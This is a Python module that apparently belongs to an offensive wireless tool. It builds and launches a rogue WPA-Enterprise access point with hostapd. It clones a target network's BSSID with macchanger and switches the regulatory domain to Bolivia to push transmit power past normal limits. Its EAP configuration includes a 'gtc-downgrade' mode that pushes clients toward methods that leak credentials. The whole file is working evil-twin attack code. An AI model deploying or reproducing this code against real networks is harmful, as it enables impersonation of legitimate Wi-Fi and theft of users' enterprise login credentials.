import subprocess
import os

def set_tx_power(iface, power=30):
    subprocess.run(["iw", "reg", "set", "BO"],
                   stderr=subprocess.DEVNULL)
    subprocess.run(["iwconfig", iface, "txpower", str(power)],
                   stderr=subprocess.DEVNULL)
    print(f"[+] TX power set to {power}dBm")


def clone_mac(iface, bssid):
    subprocess.run(["ip", "link", "set", iface, "down"],
                   stderr=subprocess.DEVNULL)
    subprocess.run(["macchanger", "-m", bssid, iface],
                   stderr=subprocess.DEVNULL)
    subprocess.run(["ip", "link", "set", iface, "up"],
                   stderr=subprocess.DEVNULL)
    print(f"[+] MAC cloned → {bssid}")


def generate_hostapd_conf(iface, ssid, channel=6,
                           negotiate="balanced", bssid=None):
    if negotiate == "gtc-downgrade":
        eap_user = '*       PEAP,TTLS,TLS,FAST\n"t"*    GTC    [2]\n'
    elif negotiate == "balanced":
        eap_user = '*       PEAP,TTLS,TLS,FAST\n"t"*    GTC,MSCHAPV2,MD5,TTLS-PAP    [2]\n'
    else:
        eap_user = '*       PEAP,TTLS,TLS,FAST\n"t"*    MSCHAPV2,MD5    [2]\n'

    with open("/tmp/eapx.eap_user", "w") as f:
        f.write(eap_user)

    base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    cert_dir = os.path.join(base_dir, "certs")

    conf = f"""interface={iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
auth_algs=3
wpa=2
wpa_key_mgmt=WPA-EAP
rsn_pairwise=CCMP
ieee8021x=1
eap_server=1
eap_user_file=/tmp/eapx.eap_user
ca_cert={cert_dir}/ca.pem
server_cert={cert_dir}/server.pem
private_key={cert_dir}/server.key
logger_stdout=-1
logger_stdout_level=0
"""
    if bssid:
        conf = f"bssid={bssid}\n" + conf
    with open("/tmp/eapx_hostapd.conf", "w") as f:
        f.write(conf)

    print(f"[+] Config → SSID: {ssid} | ch{channel} | Mode: {negotiate}")


def launch_ap(iface, ssid, channel=6, negotiate="balanced",
              bssid=None, boost_tx=True):

    if boost_tx:
        set_tx_power(iface)

    if bssid:
        clone_mac(iface, bssid)

    generate_hostapd_conf(iface, ssid, channel, negotiate, bssid)
    print("[*] Launching rogue AP... Press Ctrl+C to stop\n")
    try:
        proc = subprocess.Popen(["hostapd", "/tmp/eapx_hostapd.conf"])
        proc.wait()
    except KeyboardInterrupt:
        proc.terminate()
        proc.wait()
        print("\n[*] Rogue AP stopped")
